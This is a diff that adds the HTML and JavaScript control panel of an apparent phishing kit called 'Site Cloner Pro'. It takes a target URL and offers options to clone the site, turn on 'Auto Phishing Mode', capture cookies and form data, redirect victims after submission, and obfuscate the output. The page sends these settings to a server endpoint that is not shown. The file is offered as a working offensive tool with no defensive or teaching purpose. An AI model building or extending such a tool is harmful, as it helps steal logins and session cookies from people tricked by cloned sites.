@@ -1,0 +1,289 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <title>Site Cloner Pro</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #0a0a0a;
+            color: #ddd;
+            font-family: monospace;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .container {
+            background: #111;
+            padding: 30px;
+            border-radius: 8px;
+            border: 1px solid #333;
+            width: 100%;
+            max-width: 600px;
+        }
+        h1 {
+            text-align: center;
+            margin-bottom: 20px;
+            font-size: 20px;
+            font-weight: normal;
+        }
+        .section {
+            margin-bottom: 20px;
+            padding: 15px;
+            background: #0d0d0d;
+            border: 1px solid #222;
+            border-radius: 4px;
+        }
+        .section-title {
+            font-size: 13px;
+            color: #aaa;
+            margin-bottom: 10px;
+        }
+        label {
+            display: block;
+            margin-bottom: 5px;
+            font-size: 12px;
+            color: #aaa;
+        }
+        input[type="text"], input[type="number"] {
+            width: 100%;
+            padding: 10px;
+            background: #000;
+            border: 1px solid #333;
+            color: #ddd;
+            font-family: monospace;
+            font-size: 13px;
+            border-radius: 4px;
+            outline: none;
+            margin-bottom: 8px;
+        }
+        input:focus {
+            border-color: #555;
+        }
+        .checkbox-group {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 8px;
+        }
+        .checkbox-group input[type="checkbox"] {
+            width: auto;
+        }
+        .checkbox-group label {
+            margin: 0;
+        }
+        button {
+            width: 100%;
+            padding: 14px;
+            background: #222;
+            color: #ddd;
+            border: 1px solid #444;
+            cursor: pointer;
+            font-family: monospace;
+            font-size: 14px;
+            border-radius: 4px;
+            transition: background 0.2s;
+        }
+        button:hover {
+            background: #333;
+        }
+        .status {
+            margin-top: 15px;
+            font-size: 12px;
+            color: #aaa;
+            min-height: 20px;
+            white-space: pre-wrap;
+        }
+        .progress {
+            width: 100%;
+            height: 4px;
+            background: #000;
+            border-radius: 2px;
+            margin-top: 10px;
+            overflow: hidden;
+            display: none;
+        }
+        .progress-bar {
+            height: 100%;
+            background: #555;
+            width: 0%;
+            transition: width 0.3s;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Site Cloner Pro</h1>
+        
+        <div class="section">
+            <div class="section-title">Target</div>
+            <label>URL</label>
+            <input type="text" id="targetUrl" placeholder="https://example.com">
+        </div>
+        
+        <div class="section">
+            <div class="section-title">Phishing Options</div>
+            
+            <div class="checkbox-group">
+                <input type="checkbox" id="autoPhish" checked>
+                <label for="autoPhish">Auto Phishing Mode</label>
+            </div>
+            
+            <div class="checkbox-group">
+                <input type="checkbox" id="captureCookies" checked>
+                <label for="captureCookies">Capture Cookies</label>
+            </div>
+            
+            <div class="checkbox-group">
+                <input type="checkbox" id="captureForm" checked>
+                <label for="captureForm">Capture Form Data</label>
+            </div>
+            
+            <label>Redirect URL (after submit)</label>
+            <input type="text" id="redirectUrl" placeholder="https://example.com/login">
+        </div>
+        
+        <div class="section">
+            <div class="section-title">Clone Options</div>
+            
+            <div class="checkbox-group">
+                <input type="checkbox" id="cloneCSS" checked>
+                <label for="cloneCSS">Clone CSS</label>
+            </div>
+            
+            <div class="checkbox-group">
+                <input type="checkbox" id="cloneJS" checked>
+                <label for="cloneJS">Clone JavaScript</label>
+            </div>
+            
+            <div class="checkbox-group">
+                <input type="checkbox" id="cloneImages" checked>
+                <label for="cloneImages">Clone Images</label>
+            </div>
+            
+            <div class="checkbox-group">
+                <input type="checkbox" id="cloneFonts" checked>
+                <label for="cloneFonts">Clone Fonts</label>
+            </div>
+            
+            <div class="checkbox-group">
+                <input type="checkbox" id="cloneVideos" checked>
+                <label for="cloneVideos">Clone Videos</label>
+            </div>
+            
+            <label>Max Depth (0 = unlimited)</label>
+            <input type="number" id="maxDepth" value="0" min="0">
+            
+            <label>Max Resources (0 = unlimited)</label>
+            <input type="number" id="maxResources" value="0" min="0">
+        </div>
+        
+        <div class="section">
+            <div class="section-title">Output Options</div>
+            
+            <div class="checkbox-group">
+                <input type="checkbox" id="obfuscate" checked>
+                <label for="obfuscate">Obfuscate JavaScript</label>
+            </div>
+            
+            <div class="checkbox-group">
+                <input type="checkbox" id="minify" checked>
+                <label for="minify">Minify HTML/CSS/JS</label>
+            </div>
+            
+            <div class="checkbox-group">
+                <input type="checkbox" id="randomizeNames" checked>
+                <label for="randomizeNames">Randomize File Names</label>
+            </div>
+            
+            <label>Output Format</label>
+            <input type="text" id="outputFormat" value="zip" readonly>
+        </div>
+        
+        <button onclick="startClone()">Start Clone</button>
+        
+        <div class="progress" id="progress">
+            <div class="progress-bar" id="progressBar"></div>
+        </div>
+        
+        <div class="status" id="status">Ready</div>
+    </div>
+
+    <script>
+        async function startClone() {
+            const config = {
+                url: document.getElementById('targetUrl').value,
+                phishing: {
+                    enabled: document.getElementById('autoPhish').checked,
+                    captureCookies: document.getElementById('captureCookies').checked,
+                    captureForm: document.getElementById('captureForm').checked,
+                    redirectUrl: document.getElementById('redirectUrl').value
+                },
+                clone: {
+                    css: document.getElementById('cloneCSS').checked,
+                    js: document.getElementById('cloneJS').checked,
+                    images: document.getElementById('cloneImages').checked,
+                    fonts: document.getElementById('cloneFonts').checked,
+                    videos: document.getElementById('cloneVideos').checked,
+                    maxDepth: Number(document.getElementById('maxDepth').value),
+                    maxResources: Number(document.getElementById('maxResources').value)
+                },
+                output: {
+                    obfuscate: document.getElementById('obfuscate').checked,
+                    minify: document.getElementById('minify').checked,
+                    randomizeNames: document.getElementById('randomizeNames').checked,
+                    format: document.getElementById('outputFormat').value
+                }
+            };
+            
+            if (!config.url) {
+                document.getElementById('status').textContent = 'URL required';
+                return;
+            }
+            
+            const status = document.getElementById('status');
+            const progress = document.getElementById('progress');
+            const progressBar = document.getElementById('progressBar');
+            
+            status.textContent = 'Starting...';
+            progress.style.display = 'block';
+            progressBar.style.width = '10%';
+            
+            try {
+                const response = await fetch('/clone', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(config)
+                });
+                
+                if (response.ok) {
+                    progressBar.style.width = '90%';
+                    status.textContent = 'Downloading...';
+                    
+                    const blob = await response.blob();
+                    const downloadUrl = URL.createObjectURL(blob);
+                    const a = document.createElement('a');
+                    a.href = downloadUrl;
+                    a.download = `clone_${Date.now()}.zip`;
+                    a.click();
+                    
+                    progressBar.style.width = '100%';
+                    status.textContent = 'Complete!';
+                    
+                    setTimeout(() => {
+                        progress.style.display = 'none';
+                        progressBar.style.width = '0%';
+                    }, 2000);
+                } else {
+                    const error = await response.json();
+                    status.textContent = `Error: ${error.error}`;
+                }
+            } catch(e) {
+                status.textContent = `Error: ${e.message}`;
+            }
+        }
+    </script>
+</body>
+</html>
